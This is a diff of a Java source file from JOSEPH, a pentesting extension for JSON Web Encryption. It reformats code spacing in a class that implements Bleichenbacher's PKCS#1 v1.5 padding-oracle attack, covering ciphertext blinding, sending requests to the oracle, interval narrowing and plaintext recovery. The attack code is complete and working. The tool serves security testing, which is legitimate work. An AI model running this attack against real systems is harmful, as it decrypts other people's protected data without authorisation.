@@ -1,17 +1,17 @@
 /**
  * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
  * Copyright (C) 2016 Dennis Detering
- *
+ * <p>
  * This program is free software; you can redistribute it and/or modify it under
  * the terms of the GNU General Public License as published by the Free Software
  * Foundation; either version 2 of the License, or (at your option) any later
  * version.
- *
+ * <p>
  * This program is distributed in the hope that it will be useful, but WITHOUT
  * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
  * details.
- *
+ * <p>
  * You should have received a copy of the GNU General Public License along with
  * this program; if not, write to the Free Software Foundation, Inc., 51
  * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
@@ -93,11 +93,11 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
 
         // b computation
         int tmp = this.pubKey.getModulus().bitLength();
-        while ( tmp % 8 != 0 ) {
+        while (tmp % 8 != 0) {
             tmp++;
         }
-        tmp = (( tmp / 8) - 2 ) * 8;
-        this.bigB = BigInteger.valueOf( 2 ).pow( tmp );
+        tmp = ((tmp / 8) - 2) * 8;
+        this.bigB = BigInteger.valueOf(2).pow(tmp);
 
         loggerInstance.log(getClass(), "B computed: " + this.bigB.toString(16), Logger.LogLevel.INFO);
         loggerInstance.log(getClass(), "Blocksize: " + blockSize + " bytes", Logger.LogLevel.INFO);
@@ -111,8 +111,8 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
         if (this.msgIsPkcs) {
             loggerInstance.log(getClass(), "Step skipped --> " + "Message is considered as PKCS compliant.", Logger.LogLevel.INFO);
             this.s0 = BigInteger.ONE;
-            this.c0 = new BigInteger( 1, this.encryptedKey );
-            this.m = new Interval[] { new Interval( BigInteger.valueOf( 2 ).multiply( this.bigB ), ( BigInteger.valueOf( 3 ).multiply( this.bigB ) ).subtract( BigInteger.ONE ) ) };
+            this.c0 = new BigInteger(1, this.encryptedKey);
+            this.m = new Interval[]{new Interval(BigInteger.valueOf(2).multiply(this.bigB), (BigInteger.valueOf(3).multiply(this.bigB)).subtract(BigInteger.ONE))};
         } else {
             stepOne();
         }
@@ -146,7 +146,7 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
 
     @Override
     protected void process(List<BigInteger> chunks) {
-        if(!this.isCancelled()) {
+        if (!this.isCancelled()) {
             for (BigInteger s : chunks) {
                 this.panelReference.setCurrentSValue(s);
             }
@@ -177,7 +177,7 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
                 return;
             }
 
-            this.si = this.si.add( BigInteger.ONE );
+            this.si = this.si.add(BigInteger.ONE);
             send = prepareMsg(ciphered, this.si);
 
             request = this.requestResponse.getRequest();
@@ -193,21 +193,21 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
 
         } while (oracle.getResult(response.getResponse()) != BleichenbacherPkcs1Oracle.Result.VALID);
 
-        this.c0 = new BigInteger( 1, send );
+        this.c0 = new BigInteger(1, send);
         this.s0 = this.si;
         // mi = {[2B,3B-1]}
-        this.m = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB), (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
+        this.m = new Interval[]{new Interval(BigInteger.valueOf(2).multiply(bigB), (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE))};
 
         loggerInstance.log(getClass(), "Found s0 : " + this.si, Logger.LogLevel.INFO);
     }
 
     private void stepTwo(final int i) throws Exception {
-        if ( i == 1 ) {
+        if (i == 1) {
             this.stepTwoA();
         } else {
-            if ( i > 1 && this.m.length >= 2 ) {
+            if (i > 1 && this.m.length >= 2) {
                 stepTwoB();
-            } else if ( this.m.length == 1 ) {
+            } else if (this.m.length == 1) {
                 stepTwoC();
             }
         }
@@ -224,15 +224,15 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
         loggerInstance.log(getClass(), "Step 2a: Starting the search", Logger.LogLevel.INFO);
 
         // si = ceil(n/(3B))
-        BigInteger tmp[] = n.divideAndRemainder( BigInteger.valueOf( 3 ).multiply( bigB ) );
-        if ( BigInteger.ZERO.compareTo( tmp[1] ) != 0 ) {
-            this.si = tmp[0].add( BigInteger.ONE );
+        BigInteger tmp[] = n.divideAndRemainder(BigInteger.valueOf(3).multiply(bigB));
+        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
+            this.si = tmp[0].add(BigInteger.ONE);
         } else {
             this.si = tmp[0];
         }
 
         // correction will be done in do while
-        this.si = this.si.subtract( BigInteger.ONE );
+        this.si = this.si.subtract(BigInteger.ONE);
 
         IHttpRequestResponse response;
         byte[] request;
@@ -244,8 +244,8 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
                 return;
             }
 
-            this.si = this.si.add( BigInteger.ONE );
-            send = prepareMsg( this.c0, this.si );
+            this.si = this.si.add(BigInteger.ONE);
+            send = prepareMsg(this.c0, this.si);
 
             request = this.requestResponse.getRequest();
             String[] components = Decoder.getComponents(this.parameter.getJoseValue());
@@ -277,8 +277,8 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
                 return;
             }
 
-            this.si = this.si.add( BigInteger.ONE );
-            send = prepareMsg( this.c0, this.si );
+            this.si = this.si.add(BigInteger.ONE);
+            send = prepareMsg(this.c0, this.si);
 
             request = this.requestResponse.getRequest();
             String[] components = Decoder.getComponents(this.parameter.getJoseValue());
@@ -305,17 +305,17 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
         loggerInstance.log(getClass(), "Step 2c: Searching with one interval left", Logger.LogLevel.INFO);
 
         // initial ri computation - ri = 2(b*(si-1)-2*B)/n
-        BigInteger ri = this.si.multiply( this.m[0].upper );
-        ri = ri.subtract( BigInteger.valueOf( 2 ).multiply( this.bigB ) );
-        ri = ri.multiply( BigInteger.valueOf( 2 ) );
-        ri = ri.divide( n );
+        BigInteger ri = this.si.multiply(this.m[0].upper);
+        ri = ri.subtract(BigInteger.valueOf(2).multiply(this.bigB));
+        ri = ri.multiply(BigInteger.valueOf(2));
+        ri = ri.divide(n);
 
         // initial si computation
-        BigInteger upperBound = step2cComputeUpperBound( ri, n, this.m[0].lower );
-        BigInteger lowerBound = step2cComputeLowerBound( ri, n, this.m[0].upper );
+        BigInteger upperBound = step2cComputeUpperBound(ri, n, this.m[0].lower);
+        BigInteger lowerBound = step2cComputeLowerBound(ri, n, this.m[0].upper);
 
         // to counter .add operation in do while
-        this.si = lowerBound.subtract( BigInteger.ONE );
+        this.si = lowerBound.subtract(BigInteger.ONE);
 
         do {
             // Check if user has cancelled the worker
@@ -324,16 +324,16 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
                 return;
             }
 
-            this.si = this.si.add( BigInteger.ONE );
+            this.si = this.si.add(BigInteger.ONE);
             // lowerBound <= si < upperBound
-            if ( this.si.compareTo( upperBound ) > 0 ) {
+            if (this.si.compareTo(upperBound) > 0) {
                 // new values
-                ri = ri.add( BigInteger.ONE );
-                upperBound = step2cComputeUpperBound( ri, n, this.m[0].lower );
-                lowerBound = step2cComputeLowerBound( ri, n, this.m[0].upper );
+                ri = ri.add(BigInteger.ONE);
+                upperBound = step2cComputeUpperBound(ri, n, this.m[0].lower);
+                lowerBound = step2cComputeLowerBound(ri, n, this.m[0].upper);
                 this.si = lowerBound;
             }
-            send = prepareMsg( this.c0, this.si );
+            send = prepareMsg(this.c0, this.si);
 
             request = this.requestResponse.getRequest();
             String[] components = Decoder.getComponents(this.parameter.getJoseValue());
@@ -350,23 +350,23 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
         loggerInstance.log(getClass(), "Matching response: " + helpers.bytesToString(response.getResponse()), Logger.LogLevel.DEBUG);
     }
 
-    private BigInteger step2cComputeLowerBound( final BigInteger r, final BigInteger modulus, final BigInteger upperIntervalBound ) {
-        BigInteger lowerBound = BigInteger.valueOf( 2 ).multiply( this.bigB );
-        lowerBound = lowerBound.add( r.multiply( modulus ) );
-        lowerBound = lowerBound.divide( upperIntervalBound );
+    private BigInteger step2cComputeLowerBound(final BigInteger r, final BigInteger modulus, final BigInteger upperIntervalBound) {
+        BigInteger lowerBound = BigInteger.valueOf(2).multiply(this.bigB);
+        lowerBound = lowerBound.add(r.multiply(modulus));
+        lowerBound = lowerBound.divide(upperIntervalBound);
 
         return lowerBound;
     }
 
-    private BigInteger step2cComputeUpperBound( final BigInteger r, final BigInteger modulus, final BigInteger lowerIntervalBound ) {
-        BigInteger upperBound = BigInteger.valueOf( 3 ).multiply( this.bigB );
-        upperBound = upperBound.add( r.multiply( modulus ) );
-        upperBound = upperBound.divide( lowerIntervalBound );
+    private BigInteger step2cComputeUpperBound(final BigInteger r, final BigInteger modulus, final BigInteger lowerIntervalBound) {
+        BigInteger upperBound = BigInteger.valueOf(3).multiply(this.bigB);
+        upperBound = upperBound.add(r.multiply(modulus));
+        upperBound = upperBound.divide(lowerIntervalBound);
 
         return upperBound;
     }
 
-    private void stepThree( final int i ) throws Exception {
+    private void stepThree(final int i) throws Exception {
         BigInteger n = this.pubKey.getModulus();
         BigInteger r;
         BigInteger upperBound;
@@ -374,61 +374,61 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
         BigInteger max;
         BigInteger min;
         BigInteger[] tmp;
-        ArrayList<Interval> ms = new ArrayList<>( 15 );
+        ArrayList<Interval> ms = new ArrayList<>(15);
 
-        for ( Interval interval : this.m ) {
-            upperBound = step3ComputeUpperBound( this.si, n, interval.upper );
-            lowerBound = step3ComputeLowerBound( this.si, n, interval.lower );
+        for (Interval interval : this.m) {
+            upperBound = step3ComputeUpperBound(this.si, n, interval.upper);
+            lowerBound = step3ComputeLowerBound(this.si, n, interval.lower);
 
             r = lowerBound;
             // lowerBound <= r <= upperBound
-            while ( r.compareTo( upperBound ) < 1 ) {
+            while (r.compareTo(upperBound) < 1) {
                 // ceil((2*B+r*n)/si)
-                max = ( BigInteger.valueOf( 2 ).multiply( this.bigB ) ).add( r.multiply( n ) );
-                tmp = max.divideAndRemainder( this.si );
-                if ( BigInteger.ZERO.compareTo( tmp[1] ) != 0 ) {
-                    max = tmp[0].add( BigInteger.ONE );
+                max = (BigInteger.valueOf(2).multiply(this.bigB)).add(r.multiply(n));
+                tmp = max.divideAndRemainder(this.si);
+                if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
+                    max = tmp[0].add(BigInteger.ONE);
                 } else {
                     max = tmp[0];
                 }
 
                 // floor((3*B-1+r*n)/si
-                min = BigInteger.valueOf( 3 ).multiply( this.bigB );
-                min = min.subtract( BigInteger.ONE );
-                min = min.add( r.multiply( n ) );
-                min = min.divide( this.si );
+                min = BigInteger.valueOf(3).multiply(this.bigB);
+                min = min.subtract(BigInteger.ONE);
+                min = min.add(r.multiply(n));
+                min = min.divide(this.si);
 
                 // build new interval
-                if ( interval.lower.compareTo( max ) > 0 ) {
+                if (interval.lower.compareTo(max) > 0) {
                     max = interval.lower;
                 }
-                if ( interval.upper.compareTo( min ) < 0 ) {
+                if (interval.upper.compareTo(min) < 0) {
                     min = interval.upper;
                 }
-                if ( max.compareTo( min ) <= 0 ) {
-                    ms.add( new Interval( max, min ) );
+                if (max.compareTo(min) <= 0) {
+                    ms.add(new Interval(max, min));
                 }
                 // one further....
-                r = r.add( BigInteger.ONE );
+                r = r.add(BigInteger.ONE);
             }
         }
 
         loggerInstance.log(getClass(), " # of intervals for M" + i + ": " + ms.size(), Logger.LogLevel.INFO);
 
-        if(ms.size() == 0) {
+        if (ms.size() == 0) {
             throw new Exception("Zero intervals left, validity oracle seems to be wrong!");
         }
 
-        this.m = ms.toArray( new Interval[ms.size()] );
+        this.m = ms.toArray(new Interval[ms.size()]);
     }
 
-    private BigInteger step3ComputeUpperBound( final BigInteger s, final BigInteger modulus, final BigInteger upperIntervalBound ) {
-        BigInteger upperBound = upperIntervalBound.multiply( s );
-        upperBound = upperBound.subtract( BigInteger.valueOf( 2 ).multiply( bigB ) );
+    private BigInteger step3ComputeUpperBound(final BigInteger s, final BigInteger modulus, final BigInteger upperIntervalBound) {
+        BigInteger upperBound = upperIntervalBound.multiply(s);
+        upperBound = upperBound.subtract(BigInteger.valueOf(2).multiply(bigB));
         // ceil
-        BigInteger[] tmp = upperBound.divideAndRemainder( modulus );
-        if ( BigInteger.ZERO.compareTo( tmp[1] ) != 0 ) {
-            upperBound = BigInteger.ONE.add( tmp[0] );
+        BigInteger[] tmp = upperBound.divideAndRemainder(modulus);
+        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
+            upperBound = BigInteger.ONE.add(tmp[0]);
         } else {
             upperBound = tmp[0];
         }
@@ -436,22 +436,22 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
         return upperBound;
     }
 
-    private BigInteger step3ComputeLowerBound( final BigInteger s, final BigInteger modulus, final BigInteger lowerIntervalBound ) {
-        BigInteger lowerBound = lowerIntervalBound.multiply( s );
-        lowerBound = lowerBound.subtract( BigInteger.valueOf( 3 ).multiply( this.bigB ) );
-        lowerBound = lowerBound.add( BigInteger.ONE );
-        lowerBound = lowerBound.divide( modulus );
+    private BigInteger step3ComputeLowerBound(final BigInteger s, final BigInteger modulus, final BigInteger lowerIntervalBound) {
+        BigInteger lowerBound = lowerIntervalBound.multiply(s);
+        lowerBound = lowerBound.subtract(BigInteger.valueOf(3).multiply(this.bigB));
+        lowerBound = lowerBound.add(BigInteger.ONE);
+        lowerBound = lowerBound.divide(modulus);
 
         return lowerBound;
     }
 
 
-    private boolean stepFour( final int i ) {
+    private boolean stepFour(final int i) {
         boolean resultFound = false;
 
-        if ( this.m.length == 1 && this.m[0].lower.compareTo( this.m[0].upper ) == 0 ) {
-            BigInteger solution = this.s0.modInverse( this.pubKey.getModulus() );
-            solution = solution.multiply( this.m[0].upper ).mod( this.pubKey.getModulus() );
+        if (this.m.length == 1 && this.m[0].lower.compareTo(this.m[0].upper) == 0) {
+            BigInteger solution = this.s0.modInverse(this.pubKey.getModulus());
+            solution = solution.multiply(this.m[0].upper).mod(this.pubKey.getModulus());
 
             publish(solution);
 
@@ -469,19 +469,19 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
      * @param si factor
      * @return Prepared message as byte array
      */
-    private byte[] prepareMsg( final BigInteger originalMessage, final BigInteger si ) {
+    private byte[] prepareMsg(final BigInteger originalMessage, final BigInteger si) {
         byte[] msg;
         BigInteger tmp;
 
         // encrypt: si^e mod n
-        tmp = si.modPow( this.pubKey.getPublicExponent(), this.pubKey.getModulus() );
+        tmp = si.modPow(this.pubKey.getPublicExponent(), this.pubKey.getModulus());
 
         // blind: c0*(si^e) mod n
         // or: m*si mod n (in case of plaintext m_Oracle)
-        tmp = originalMessage.multiply( tmp );
-        tmp = tmp.mod( this.pubKey.getModulus() );
+        tmp = originalMessage.multiply(tmp);
+        tmp = tmp.mod(this.pubKey.getModulus());
         // get bytes
-        msg = correctSize( tmp.toByteArray(), this.blockSize, true );
+        msg = correctSize(tmp.toByteArray(), this.blockSize, true);
 
         return msg;
     }
@@ -494,23 +494,23 @@ class BleichenbacherPkcs1DecryptionAttackExecutor extends SwingWorker<Integer, B
      * @param removeSignByte If set to TRUE leading sign bytes will be removed
      * @return Size corrected array (maybe padded or stripped the sign byte)
      */
-    private static byte[] correctSize( final byte[] array, final int blockSize, final boolean removeSignByte ) {
+    private static byte[] correctSize(final byte[] array, final int blockSize, final boolean removeSignByte) {
         int remainder = array.length % blockSize;
         byte[] result = array;
         byte[] tmp;
 
-        if ( removeSignByte && remainder > 0 && result[0] == 0x0 ) {
+        if (removeSignByte && remainder > 0 && result[0] == 0x0) {
             // extract signing byte if present
             tmp = new byte[result.length - 1];
-            System.arraycopy( result, 1, tmp, 0, tmp.length );
+            System.arraycopy(result, 1, tmp, 0, tmp.length);
             result = tmp;
             remainder = tmp.length % blockSize;
         }
 
-        if ( remainder > 0 ) {
+        if (remainder > 0) {
             // add zeros to fit size
             tmp = new byte[result.length + blockSize - remainder];
-            System.arraycopy( result, 0, tmp, blockSize - remainder, result.length );
+            System.arraycopy(result, 0, tmp, blockSize - remainder, result.length);
             result = tmp;
         }
 
